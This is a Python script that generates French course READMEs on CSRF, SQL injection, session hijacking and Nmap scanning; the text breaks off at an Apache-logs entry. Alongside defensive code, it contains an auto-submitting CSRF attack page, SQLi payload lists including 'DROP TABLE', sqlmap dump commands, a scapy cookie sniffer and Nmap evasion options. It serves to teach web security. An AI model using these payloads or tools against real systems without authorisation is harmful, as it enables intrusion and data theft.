#!/usr/bin/env python3
"""
Génère des README complets style support de cours pour chaque repo
"""

import os
from datetime import datetime

REPOS_DIR = "repos"

# Contenu détaillé pour chaque repo
COURSE_CONTENT = {
    "Python.CSRF.Demo": {
        "title": "CSRF (Cross-Site Request Forgery) - Guide Complet",
        "intro": """
## Introduction

Le **CSRF (Cross-Site Request Forgery)**, également appelé "session riding" ou "one-click attack", est une vulnérabilité web critique permettant à un attaquant de forcer un utilisateur authentifié à exécuter des actions non désirées sur une application web.

### Pourquoi c'est dangereux ?

- L'attaquant exploite la **confiance** que le serveur a envers le navigateur de l'utilisateur
- Les cookies de session sont envoyés **automatiquement** avec chaque requête
- L'utilisateur n'a aucune conscience de l'attaque
""",
        "theory": """
## Théorie et Concepts

### Comment fonctionne CSRF ?

```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│  Victime    │     │  Site       │     │  Site       │
│  (Browser)  │     │  Malveillant│     │  Cible      │
└─────┬───────┘     └──────┬──────┘     └──────┬──────┘
      │                    │                   │
      │  1. Visite site    │                   │
      │    malveillant     │                   │
      │◄───────────────────│                   │
      │                    │                   │
      │  2. Page avec      │                   │
      │    formulaire      │                   │
      │    caché           │                   │
      │◄───────────────────│                   │
      │                    │                   │
      │  3. Requête auto   │                   │
      │    avec cookies    │                   │
      │────────────────────┼──────────────────►│
      │                    │                   │
      │  4. Action exécutée│                   │
      │    (transfert, etc)│                   │
      │◄───────────────────┼───────────────────│
```

### Conditions nécessaires pour CSRF

1. **Session active** : La victime doit être authentifiée sur le site cible
2. **Cookies automatiques** : Le navigateur envoie les cookies sans vérification
3. **Action prévisible** : L'attaquant connaît les paramètres de la requête
4. **Pas de vérification d'origine** : Le serveur ne vérifie pas d'où vient la requête

### Types d'attaques CSRF

| Type | Description | Exemple |
|------|-------------|---------|
| GET-based | Via balise img/iframe | `<img src="http://bank.com/transfer?to=attacker&amount=1000">` |
| POST-based | Via formulaire auto-soumis | Formulaire caché avec JavaScript |
| JSON-based | API REST vulnérables | Requête XHR/Fetch cross-origin |
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Créer une attaque CSRF (pour comprendre)

```html
<!-- Page malveillante : evil.html -->
<!DOCTYPE html>
<html>
<body>
  <h1>Gagnez un iPhone !</h1>

  <!-- Formulaire caché qui s'auto-soumet -->
  <form id="csrf-form" action="https://bank.com/transfer" method="POST" style="display:none">
    <input name="to" value="attacker-account">
    <input name="amount" value="10000">
  </form>

  <script>
    // Soumission automatique
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

### 2. Implémenter une protection CSRF en Python/Flask

```python
from flask import Flask, session, request, abort
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

def generate_csrf_token():
    \"\"\"Génère un token CSRF unique par session\"\"\"
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

def validate_csrf_token():
    \"\"\"Valide le token CSRF pour les requêtes POST\"\"\"
    token = request.form.get('csrf_token') or request.headers.get('X-CSRF-Token')
    if not token or token != session.get('csrf_token'):
        abort(403, 'CSRF token invalide')

# Middleware pour vérifier CSRF sur toutes les requêtes POST
@app.before_request
def csrf_protect():
    if request.method == 'POST':
        validate_csrf_token()

# Rendre le token disponible dans les templates
@app.context_processor
def inject_csrf_token():
    return dict(csrf_token=generate_csrf_token())

@app.route('/transfer', methods=['GET', 'POST'])
def transfer():
    if request.method == 'POST':
        # Token déjà validé par le middleware
        to_account = request.form['to']
        amount = request.form['amount']
        # Effectuer le transfert...
        return f'Transfert de {amount}€ vers {to_account}'

    return '''
        <form method="POST">
            <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
            <input name="to" placeholder="Compte destinataire">
            <input name="amount" placeholder="Montant">
            <button type="submit">Transférer</button>
        </form>
    '''
```

### 3. Protection avec Django (intégrée)

```python
# settings.py
MIDDLEWARE = [
    'django.middleware.csrf.CsrfViewMiddleware',
    # ...
]

# Dans les templates
<form method="POST">
    {% csrf_token %}
    <!-- champs du formulaire -->
</form>

# Pour les requêtes AJAX
const csrfToken = document.querySelector('[name=csrfmiddlewaretoken]').value;

fetch('/api/action/', {
    method: 'POST',
    headers: {
        'X-CSRFToken': csrfToken,
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
});
```
""",
        "best_practices": """
## Bonnes Pratiques

### Protection côté serveur

1. **Token Synchronizer Pattern**
   - Générer un token unique par session
   - Inclure dans chaque formulaire
   - Valider côté serveur à chaque requête

2. **Double Submit Cookie**
   - Envoyer le token dans un cookie ET dans le corps de la requête
   - Comparer les deux valeurs côté serveur

3. **SameSite Cookie Attribute**
```python
# Flask
response.set_cookie('session', value, samesite='Strict')

# Django (settings.py)
SESSION_COOKIE_SAMESITE = 'Strict'
CSRF_COOKIE_SAMESITE = 'Strict'
```

### Valeurs SameSite

| Valeur | Comportement |
|--------|--------------|
| `Strict` | Cookie jamais envoyé cross-site |
| `Lax` | Envoyé uniquement pour navigation GET top-level |
| `None` | Toujours envoyé (nécessite Secure) |

### Headers de sécurité

```python
# Vérifier l'origine de la requête
@app.before_request
def check_origin():
    origin = request.headers.get('Origin')
    referer = request.headers.get('Referer')

    allowed_origins = ['https://mysite.com']

    if origin and origin not in allowed_origins:
        abort(403, 'Origin non autorisée')
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Ce qu'il ne faut PAS faire

1. **Token prévisible**
```python
# MAUVAIS - token basé sur le temps
csrf_token = str(int(time.time()))

# BON - token cryptographiquement aléatoire
csrf_token = secrets.token_hex(32)
```

2. **Valider uniquement la présence du token**
```python
# MAUVAIS
if 'csrf_token' in request.form:
    pass  # Accepte n'importe quel token !

# BON
if request.form.get('csrf_token') == session.get('csrf_token'):
    pass
```

3. **Token dans l'URL**
```python
# MAUVAIS - token exposé dans les logs et referer
<a href="/action?csrf_token=abc123">

# BON - token dans le corps de la requête POST
<form method="POST">
    <input type="hidden" name="csrf_token" value="...">
```

4. **Pas de protection sur les API**
```python
# MAUVAIS - API sans protection CSRF
@app.route('/api/delete', methods=['POST'])
def delete():
    return do_delete()

# BON - Vérifier le header personnalisé
@app.route('/api/delete', methods=['POST'])
def delete():
    if not request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        abort(403)
    return do_delete()
```
""",
        "tools": """
## Outils de Test

### Burp Suite

1. Intercepter une requête POST
2. Clic droit → Engagement tools → Generate CSRF PoC
3. Modifier et tester le PoC généré

### OWASP ZAP

1. Scanner automatique détecte les tokens manquants
2. Fuzzer pour tester la robustesse des tokens

### Script de test manuel

```python
import requests

# Test : requête sans token CSRF
def test_csrf_vulnerability(url):
    # Session authentifiée
    session = requests.Session()
    session.post(f'{url}/login', data={'user': 'test', 'pass': 'test'})

    # Tenter une action sans token CSRF
    response = session.post(f'{url}/change-email', data={
        'email': 'attacker@evil.com'
    })

    if response.status_code == 200:
        print('⚠️  VULNÉRABLE : Action acceptée sans token CSRF')
    elif response.status_code == 403:
        print('✓ PROTÉGÉ : Token CSRF requis')

    return response.status_code

test_csrf_vulnerability('http://localhost:5000')
```
""",
        "references": """
## Références

### Documentation officielle
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN - SameSite cookies](https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Set-Cookie/SameSite)

### Standards
- [RFC 6749 - OAuth 2.0](https://tools.ietf.org/html/rfc6749) - Recommandations sur state parameter

### Frameworks
- [Django CSRF Protection](https://docs.djangoproject.com/en/4.0/ref/csrf/)
- [Flask-WTF CSRF](https://flask-wtf.readthedocs.io/en/1.0.x/csrf/)

### Classification
- **OWASP Top 10 2021** : A01:2021 - Broken Access Control
- **CWE-352** : Cross-Site Request Forgery
"""
    },

    "Python.Sqli.Detection": {
        "title": "Injection SQL - Détection et Prévention",
        "intro": """
## Introduction

L'**injection SQL** est l'une des vulnérabilités les plus critiques et les plus exploitées. Elle permet à un attaquant d'interférer avec les requêtes qu'une application envoie à sa base de données.

### Impact potentiel

- **Lecture de données sensibles** : mots de passe, données personnelles
- **Modification/suppression de données** : corruption de la base
- **Contournement d'authentification** : accès admin sans mot de passe
- **Exécution de commandes système** : dans certains cas (xp_cmdshell, etc.)
""",
        "theory": """
## Théorie et Concepts

### Comment fonctionne l'injection SQL ?

```sql
-- Requête vulnérable
SELECT * FROM users WHERE username = '{user_input}' AND password = '{pass_input}'

-- Entrée malveillante
user_input = "admin' --"
pass_input = "anything"

-- Requête résultante
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
-- Le -- commente le reste de la requête !
```

### Types d'injections SQL

| Type | Description | Détection |
|------|-------------|-----------|
| In-band (Classic) | Résultats visibles dans la réponse | Facile |
| Blind Boolean | Différence de comportement (vrai/faux) | Moyen |
| Blind Time-based | Délai de réponse (SLEEP) | Lent |
| Out-of-band | Exfiltration via DNS/HTTP | Avancé |
| Second-order | Injection stockée, exécutée plus tard | Difficile |

### Payloads classiques

```sql
-- Authentification bypass
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin'--
admin' #

-- Union-based extraction
' UNION SELECT null,null,null --
' UNION SELECT username,password,null FROM users --

-- Blind boolean
' AND 1=1 --  (vrai)
' AND 1=2 --  (faux)
' AND SUBSTRING(username,1,1)='a' --

-- Time-based
' AND SLEEP(5) --
' AND IF(1=1,SLEEP(5),0) --
'; WAITFOR DELAY '0:0:5' --

-- Stacked queries (si supporté)
'; DROP TABLE users; --
'; INSERT INTO users VALUES('hacker','password'); --
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Détecter une injection SQL

```python
import requests
import time

def detect_sqli(url, param):
    \"\"\"Détecte les vulnérabilités SQL injection\"\"\"

    payloads = {
        'error_based': ["'", "''", "\"", "\\\\"],
        'boolean_based': ["' OR '1'='1", "' AND '1'='2"],
        'time_based': ["' AND SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--"]
    }

    results = []

    # Test error-based
    for payload in payloads['error_based']:
        response = requests.get(url, params={param: payload})
        if any(err in response.text.lower() for err in
               ['sql', 'mysql', 'syntax', 'query', 'oracle', 'postgresql']):
            results.append(f'Error-based possible: {payload}')

    # Test boolean-based
    baseline = requests.get(url, params={param: 'test'})
    for payload in payloads['boolean_based']:
        response = requests.get(url, params={param: payload})
        if len(response.text) != len(baseline.text):
            results.append(f'Boolean-based possible: {payload}')

    # Test time-based
    for payload in payloads['time_based']:
        start = time.time()
        requests.get(url, params={param: payload}, timeout=10)
        elapsed = time.time() - start
        if elapsed >= 3:
            results.append(f'Time-based possible: {payload}')

    return results

# Utilisation
vulns = detect_sqli('http://target.com/search', 'q')
for v in vulns:
    print(f'⚠️  {v}')
```

### 2. Protection avec requêtes préparées

```python
import sqlite3

# ❌ VULNÉRABLE - Concaténation de chaînes
def get_user_vulnerable(username):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    # DANGER : injection possible !
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchone()

# ✅ SÉCURISÉ - Requêtes préparées (paramétrisées)
def get_user_secure(username):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    # Le ? est remplacé de manière sécurisée
    query = "SELECT * FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    return cursor.fetchone()
```

### 3. Protection avec ORM (SQLAlchemy)

```python
from sqlalchemy import create_engine, Column, String
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

Base = declarative_base()

class User(Base):
    __tablename__ = 'users'
    username = Column(String, primary_key=True)
    password = Column(String)

engine = create_engine('sqlite:///users.db')
Session = sessionmaker(bind=engine)

# ✅ SÉCURISÉ - L'ORM gère l'échappement
def get_user_orm(username):
    session = Session()
    # Pas d'injection possible avec filter()
    user = session.query(User).filter(User.username == username).first()
    return user
```
""",
        "best_practices": """
## Bonnes Pratiques

### 1. Utiliser TOUJOURS des requêtes préparées

```python
# Python avec différents drivers

# SQLite
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# MySQL (mysql-connector)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# PostgreSQL (psycopg2)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

### 2. Validation et sanitization des entrées

```python
import re

def validate_username(username):
    \"\"\"Valide le format du username\"\"\"
    # Autoriser uniquement lettres, chiffres, underscore
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError('Username invalide')
    return username

def validate_integer(value):
    \"\"\"S'assurer que c'est un entier\"\"\"
    try:
        return int(value)
    except (ValueError, TypeError):
        raise ValueError('Entier invalide')
```

### 3. Principe du moindre privilège

```sql
-- Créer un utilisateur avec droits limités
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'secure_password';

-- Donner uniquement les droits nécessaires
GRANT SELECT, INSERT, UPDATE ON myapp.* TO 'webapp'@'localhost';
-- PAS de DELETE, DROP, etc. sauf si vraiment nécessaire
```

### 4. WAF et détection

```python
# Patterns suspects à détecter
SQLI_PATTERNS = [
    r"('|\")",
    r"(--|#|/\\*)",
    r"(union|select|insert|update|delete|drop)",
    r"(or|and)\\s+\\d+=\\d+",
    r"(sleep|waitfor|benchmark)",
    r"(load_file|into\\s+outfile)",
]

def detect_sqli_attempt(user_input):
    import re
    for pattern in SQLI_PATTERNS:
        if re.search(pattern, user_input, re.IGNORECASE):
            return True
    return False
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Faux sentiment de sécurité

```python
# MAUVAIS - échappement manuel insuffisant
def escape_input(s):
    return s.replace("'", "''")  # Contournable !

# MAUVAIS - blacklist de mots-clés
def check_sqli(s):
    banned = ['SELECT', 'UNION', 'DROP']
    for word in banned:
        if word in s.upper():
            raise Exception('SQL injection detected')
    # Contournable avec : SeLeCt, SEL/**/ECT, etc.
```

### ❌ ORM mal utilisé

```python
from sqlalchemy import text

# MAUVAIS - raw SQL dans l'ORM
def search_users(name):
    # Vulnérable malgré l'ORM !
    query = text(f"SELECT * FROM users WHERE name LIKE '%{name}%'")
    return session.execute(query)

# BON
def search_users(name):
    return session.query(User).filter(User.name.like(f'%{name}%')).all()
```

### ❌ Logs d'erreurs exposés

```python
# MAUVAIS - erreur SQL exposée à l'utilisateur
@app.errorhandler(Exception)
def handle_error(e):
    return str(e), 500  # Expose le message d'erreur SQL !

# BON - message générique
@app.errorhandler(Exception)
def handle_error(e):
    app.logger.error(f'Error: {e}')  # Log interne
    return 'Une erreur est survenue', 500
```
""",
        "tools": """
## Outils de Test

### SQLMap (automatique)

```bash
# Détection automatique
sqlmap -u "http://target.com/page?id=1" --dbs

# Avec cookie de session
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123" --dbs

# Extraction de tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Dump de données
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

### Script de fuzzing

```python
import requests

PAYLOADS = [
    "'", "''", '"', '\\\\',
    "' OR '1'='1", "' OR '1'='1'--",
    "1 OR 1=1", "1' OR '1'='1",
    "'; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "' AND SLEEP(5)--"
]

def fuzz_sqli(url, param):
    for payload in PAYLOADS:
        try:
            response = requests.get(url, params={param: payload}, timeout=10)
            print(f'[{response.status_code}] {payload[:30]}...')
        except Exception as e:
            print(f'[ERROR] {payload[:30]}... : {e}')

fuzz_sqli('http://target.com/search', 'q')
```
""",
        "references": """
## Références

### OWASP
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)

### Outils
- [SQLMap](https://sqlmap.org/) - Outil automatique d'injection SQL
- [Havij](https://itsecteam.com/) - GUI pour SQL injection

### Classification
- **OWASP Top 10 2021** : A03:2021 - Injection
- **CWE-89** : SQL Injection
"""
    },

    "Python.Session.Hijacking": {
        "title": "Session Hijacking - Comprendre et Prévenir",
        "intro": """
## Introduction

Le **session hijacking** (détournement de session) est une attaque où un attaquant prend le contrôle de la session d'un utilisateur légitime en volant ou devinant son identifiant de session.

### Types de session hijacking

1. **Session Fixation** : Forcer un ID de session connu
2. **Session Sidejacking** : Interception sur réseau non sécurisé
3. **XSS-based** : Vol via script malveillant
4. **Malware** : Vol par logiciel espion
""",
        "theory": """
## Théorie et Concepts

### Comment fonctionnent les sessions web ?

```
┌──────────┐    1. Login     ┌──────────┐
│  Client  │ ───────────────► │  Serveur │
│          │                  │          │
│          │ ◄─────────────── │          │
│          │ 2. Set-Cookie:   │          │
│          │    SESSID=abc123 │          │
│          │                  │          │
│          │ 3. Cookie:       │          │
│          │    SESSID=abc123 │          │
│          │ ───────────────► │          │
│          │                  │          │
│          │ 4. Réponse       │          │
│          │    authentifiée  │          │
│          │ ◄─────────────── │          │
└──────────┘                  └──────────┘
```

### Vecteurs d'attaque

| Vecteur | Méthode | Prévention |
|---------|---------|------------|
| Sniffing | Interception réseau | HTTPS obligatoire |
| XSS | `document.cookie` | HttpOnly, CSP |
| Session Fixation | URL avec SID | Régénérer à l'auth |
| Prediction | ID prévisible | ID cryptographique |
| Brute Force | Essai massif | Rate limiting |
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Démonstration de vol de session (éducatif)

```python
# Scénario : attaquant sur même réseau WiFi
# Utilise scapy pour intercepter les cookies

from scapy.all import sniff, TCP

def extract_cookies(packet):
    if packet.haslayer(TCP) and packet.haslayer('Raw'):
        payload = packet['Raw'].load.decode('utf-8', errors='ignore')
        if 'Cookie:' in payload:
            for line in payload.split('\\n'):
                if 'Cookie:' in line:
                    print(f'[SESSION] {line.strip()}')

# Attention : uniquement sur réseau de test !
# sniff(filter='tcp port 80', prn=extract_cookies)
```

### 2. Configuration sécurisée des sessions (Flask)

```python
from flask import Flask, session
from datetime import timedelta
import secrets

app = Flask(__name__)

# Configuration sécurisée
app.config.update(
    SECRET_KEY=secrets.token_hex(32),
    SESSION_COOKIE_SECURE=True,      # HTTPS uniquement
    SESSION_COOKIE_HTTPONLY=True,    # Pas accessible en JS
    SESSION_COOKIE_SAMESITE='Strict', # Pas de cross-site
    PERMANENT_SESSION_LIFETIME=timedelta(hours=1)  # Expiration
)

@app.after_request
def security_headers(response):
    # Régénérer l'ID de session après login
    if 'just_logged_in' in session:
        session.regenerate()
        del session['just_logged_in']
    return response

@app.route('/login', methods=['POST'])
def login():
    # ... vérification credentials ...
    session['user_id'] = user.id
    session['just_logged_in'] = True
    session['ip'] = request.remote_addr  # Binding IP
    session['ua'] = request.user_agent.string  # Binding UA
    return redirect('/dashboard')

@app.before_request
def validate_session():
    if 'user_id' in session:
        # Vérifier que l'IP/UA correspondent
        if session.get('ip') != request.remote_addr:
            session.clear()
            return redirect('/login')
```

### 3. Détection d'anomalies

```python
from collections import defaultdict
from datetime import datetime, timedelta

class SessionMonitor:
    def __init__(self):
        self.sessions = defaultdict(dict)
        self.alerts = []

    def track(self, session_id, ip, user_agent):
        now = datetime.now()
        sess = self.sessions[session_id]

        if 'ip' in sess and sess['ip'] != ip:
            self.alerts.append({
                'type': 'IP_CHANGE',
                'session': session_id,
                'old_ip': sess['ip'],
                'new_ip': ip,
                'time': now
            })

        if 'ua' in sess and sess['ua'] != user_agent:
            self.alerts.append({
                'type': 'UA_CHANGE',
                'session': session_id,
                'time': now
            })

        sess.update({
            'ip': ip,
            'ua': user_agent,
            'last_seen': now
        })

    def get_suspicious_sessions(self):
        return [a for a in self.alerts if a['time'] > datetime.now() - timedelta(hours=1)]
```
""",
        "best_practices": """
## Bonnes Pratiques

### Attributs du cookie de session

```
Set-Cookie: SESSIONID=abc123;
    Secure;          # HTTPS uniquement
    HttpOnly;        # Pas de document.cookie
    SameSite=Strict; # Pas de cross-site
    Path=/;          # Limiter le scope
    Max-Age=3600;    # Expiration
    Domain=.site.com # Limiter au domaine
```

### Régénération de session

```python
# IMPORTANT : Régénérer l'ID après changement de privilèges

def login_user(user):
    # Avant l'authentification
    session.clear()

    # Créer nouvelle session
    session['user_id'] = user.id
    session.regenerate_id()  # Nouveau SID

def elevate_privileges():
    # Après élévation (ex: accès admin)
    session.regenerate_id()

def logout_user():
    session.clear()
    session.regenerate_id()
```

### Timeouts et limites

```python
from datetime import datetime, timedelta

class SecureSession:
    ABSOLUTE_TIMEOUT = timedelta(hours=8)   # Max 8h
    IDLE_TIMEOUT = timedelta(minutes=30)    # 30min inactivité

    def validate(self):
        now = datetime.now()

        # Timeout absolu
        if now - self.created_at > self.ABSOLUTE_TIMEOUT:
            return False

        # Timeout d'inactivité
        if now - self.last_activity > self.IDLE_TIMEOUT:
            return False

        self.last_activity = now
        return True
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ ID de session prévisible

```python
# MAUVAIS - basé sur le temps
session_id = str(int(time.time()))

# MAUVAIS - basé sur l'utilisateur
session_id = hashlib.md5(username.encode()).hexdigest()

# BON - cryptographiquement aléatoire
session_id = secrets.token_urlsafe(32)
```

### ❌ Session sans expiration

```python
# MAUVAIS - session permanente
session.permanent = True
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=365)

# BON - expiration raisonnable
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)
```

### ❌ Pas de régénération après login

```python
# MAUVAIS - Session Fixation possible
@app.route('/login', methods=['POST'])
def login():
    if check_password(request.form['password']):
        session['logged_in'] = True  # Garde le même SID !
        return redirect('/dashboard')

# BON
@app.route('/login', methods=['POST'])
def login():
    if check_password(request.form['password']):
        session.clear()  # Nouvelle session
        session.regenerate()
        session['logged_in'] = True
        return redirect('/dashboard')
```
""",
        "tools": """
## Outils de Test

### Burp Suite
1. Proxy > HTTP History
2. Identifier les cookies de session
3. Sequencer pour tester l'entropie

### Script de test d'entropie

```python
import requests
import math
from collections import Counter

def test_session_entropy(url, samples=100):
    \"\"\"Analyse l'entropie des IDs de session\"\"\"
    sessions = []

    for _ in range(samples):
        response = requests.get(url)
        cookie = response.cookies.get('SESSIONID', '')
        if cookie:
            sessions.append(cookie)

    # Calculer l'entropie
    char_freq = Counter(''.join(sessions))
    total = sum(char_freq.values())
    entropy = -sum((c/total) * math.log2(c/total) for c in char_freq.values())

    print(f'Sessions collectées: {len(sessions)}')
    print(f'Longueur moyenne: {sum(len(s) for s in sessions)/len(sessions):.0f}')
    print(f'Entropie estimée: {entropy:.2f} bits/char')

    if entropy < 4:
        print('⚠️  Entropie faible - sessions prévisibles !')
    else:
        print('✓ Entropie acceptable')

test_session_entropy('http://target.com/')
```
""",
        "references": """
## Références

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)
- [RFC 6265 - HTTP State Management](https://tools.ietf.org/html/rfc6265)
"""
    },

    "Nmap.Strategies": {
        "title": "Nmap - Stratégies de Scan Réseau",
        "intro": """
## Introduction

**Nmap** (Network Mapper) est l'outil de référence pour l'exploration réseau et l'audit de sécurité. Il permet de découvrir des hôtes, services, OS et vulnérabilités.

### Cas d'utilisation

- **Inventaire réseau** : Découvrir les machines actives
- **Audit de sécurité** : Identifier les ports ouverts et services
- **Détection de vulnérabilités** : Scripts NSE
- **Forensics** : Analyse d'infrastructure
""",
        "theory": """
## Théorie et Concepts

### Types de scans

| Type | Flag | Description | Discrétion |
|------|------|-------------|------------|
| TCP Connect | `-sT` | Connexion TCP complète | Faible |
| SYN Stealth | `-sS` | Half-open (root) | Moyenne |
| UDP | `-sU` | Scan UDP (lent) | Variable |
| FIN/NULL/Xmas | `-sF/-sN/-sX` | Flags anormaux | Haute |
| ACK | `-sA` | Détection firewall | Haute |
| Ping | `-sn` | Discovery sans port | Haute |

### Handshake TCP et SYN scan

```
TCP Connect (-sT):                SYN Stealth (-sS):

Client     Server                 Client     Server
  │          │                      │          │
  │──SYN────►│                      │──SYN────►│
  │◄─SYN/ACK─│                      │◄─SYN/ACK─│
  │──ACK────►│ Connexion            │──RST────►│ Pas de connexion
  │          │ établie              │          │ complète
  │──RST────►│                      │          │
```

### États des ports

| État | Signification |
|------|--------------|
| open | Service en écoute |
| closed | Accessible mais aucun service |
| filtered | Firewall bloque les probes |
| unfiltered | Accessible, état inconnu |
| open|filtered | Pas de réponse (UDP) |
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Discovery de base

```bash
# Ping sweep - découvrir les hôtes actifs
nmap -sn 192.168.1.0/24

# ARP discovery (réseau local)
nmap -PR -sn 192.168.1.0/24

# Liste des hôtes sans scan
nmap -sL 192.168.1.0/24
```

### 2. Scan de ports

```bash
# Top 1000 ports (défaut)
nmap 192.168.1.1

# Tous les ports (1-65535)
nmap -p- 192.168.1.1

# Ports spécifiques
nmap -p 22,80,443,8080 192.168.1.1

# Range de ports
nmap -p 1-1024 192.168.1.1

# Ports UDP et TCP
nmap -sU -sT -p U:53,161,T:22,80 192.168.1.1
```

### 3. Détection de services et OS

```bash
# Version des services (-sV)
nmap -sV 192.168.1.1

# Détection OS (-O)
nmap -O 192.168.1.1

# Agressif : OS + version + scripts + traceroute
nmap -A 192.168.1.1

# Intensité de détection de version (0-9)
nmap -sV --version-intensity 5 192.168.1.1
```

### 4. Scripts NSE

```bash
# Scripts par défaut
nmap -sC 192.168.1.1
# Équivalent à : --script=default

# Scripts par catégorie
nmap --script=vuln 192.168.1.1
nmap --script=safe 192.168.1.1
nmap --script=auth 192.168.1.1

# Scripts spécifiques
nmap --script=http-title,http-headers 192.168.1.1
nmap --script=smb-vuln* 192.168.1.1

# Scripts avec arguments
nmap --script=http-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.1.1
```

### 5. Évasion de détection

```bash
# Fragmentation des paquets
nmap -f 192.168.1.1

# Timing plus lent (0=paranoid, 5=insane)
nmap -T0 192.168.1.1

# Decoys (leurres)
nmap -D RND:10 192.168.1.1

# Source port
nmap --source-port 53 192.168.1.1

# Spoofing MAC
nmap --spoof-mac Cisco 192.168.1.1

# Combiné
nmap -f -T2 -D RND:5 --source-port 53 192.168.1.1
```
""",
        "best_practices": """
## Bonnes Pratiques

### Templates de scan

```bash
# Scan rapide réseau interne
alias nmap-quick='nmap -sS -T4 --top-ports 100'

# Scan complet mais discret
alias nmap-full='nmap -sS -sV -O -T2 -p-'

# Scan de vulnérabilités
alias nmap-vuln='nmap -sV --script=vuln'

# Scan web
alias nmap-web='nmap -sV -p 80,443,8080,8443 --script=http-*'
```

### Sauvegarde des résultats

```bash
# Tous les formats
nmap -oA scan_results 192.168.1.0/24

# Format XML (pour parsing)
nmap -oX scan.xml 192.168.1.1

# Format greppable
nmap -oG scan.gnmap 192.168.1.1

# Script pour parser les résultats
cat scan.gnmap | grep "open" | cut -d: -f2
```

### Optimisation des performances

```bash
# Scan parallèle avec threads
nmap --min-parallelism 100 192.168.1.0/24

# Timeout agressif
nmap --host-timeout 30s 192.168.1.0/24

# Ignorer les hôtes down
nmap -Pn --max-retries 1 192.168.1.0/24
```

### Script Python d'automatisation

```python
import nmap
import json

def comprehensive_scan(target):
    nm = nmap.PortScanner()

    # Phase 1: Discovery
    print(f'[*] Scanning {target}...')
    nm.scan(target, arguments='-sS -sV -O -T4 --top-ports 1000')

    results = {
        'hosts': []
    }

    for host in nm.all_hosts():
        host_info = {
            'ip': host,
            'state': nm[host].state(),
            'os': nm[host].get('osmatch', []),
            'ports': []
        }

        for proto in nm[host].all_protocols():
            for port in nm[host][proto].keys():
                port_info = nm[host][proto][port]
                host_info['ports'].append({
                    'port': port,
                    'state': port_info['state'],
                    'service': port_info['name'],
                    'version': port_info.get('version', '')
                })

        results['hosts'].append(host_info)

    return results

# Utilisation
results = comprehensive_scan('192.168.1.0/24')
print(json.dumps(results, indent=2))
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Scanner sans autorisation

```bash
# TOUJOURS avoir une autorisation écrite
# Vérifier les lois locales (CFAA aux US, etc.)

# Pour les tests : utiliser des ranges privées
nmap 10.0.0.0/8
nmap 172.16.0.0/12
nmap 192.168.0.0/16

# Ou des lab comme HackTheBox, VulnHub
```

### ❌ Timing trop agressif

```bash
# MAUVAIS - Déclenche les IDS/IPS
nmap -T5 -p- target.com

# BON - Adapté à l'environnement
nmap -T2 -p- target.com  # Production
nmap -T4 -p- target.com  # Lab interne
```

### ❌ Ignorer les firewalls

```bash
# Le scan peut montrer "filtered" mais le service existe
# Essayer différentes techniques

nmap -sS target.com     # Filtré ?
nmap -sA target.com     # Détection firewall
nmap -sF target.com     # FIN scan
nmap --source-port 80 target.com  # Depuis port 80
```
""",
        "tools": """
## Outils Complémentaires

### Zenmap
Interface graphique pour Nmap avec profils de scan prédéfinis.

### Masscan
Scan ultra-rapide (millions de paquets/sec)
```bash
masscan -p1-65535 192.168.1.0/24 --rate=10000
```

### RustScan
Pré-scan rapide puis handoff à Nmap
```bash
rustscan -a 192.168.1.1 -- -sV -sC
```

### Scripts NSE utiles

```bash
# Lister les scripts disponibles
ls /usr/share/nmap/scripts/

# Catégories importantes
nmap --script-help="vuln"
nmap --script-help="exploit"
nmap --script-help="discovery"
```
""",
        "references": """
## Références

- [Documentation officielle Nmap](https://nmap.org/docs.html)
- [NSE Script Library](https://nmap.org/nsedoc/)
- [Nmap Cheat Sheet](https://www.stationx.net/nmap-cheat-sheet/)
- Livre: "Nmap Network Scanning" par Gordon Lyon
"""
    },

    # Ajouter plus de repos ici...

    "Python.Apache.Logs": {
        "title": """Analyse de Logs Apache""",
        "intro": """
## Introduction

